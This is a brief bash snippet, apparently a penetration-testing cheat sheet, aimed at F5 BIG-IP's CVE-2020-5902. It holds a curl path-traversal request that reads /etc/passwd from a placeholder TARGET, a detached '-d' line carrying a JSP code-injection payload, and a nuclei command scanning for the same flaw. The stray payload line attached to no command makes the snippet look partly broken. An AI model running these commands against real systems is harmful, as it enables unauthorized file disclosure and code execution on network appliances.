```bash
curl -sk "https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"

  -d '<% out.print("x"); %>'
nuclei -u https://TARGET -t http/cves/2020/CVE-2020-5902.yaml
```
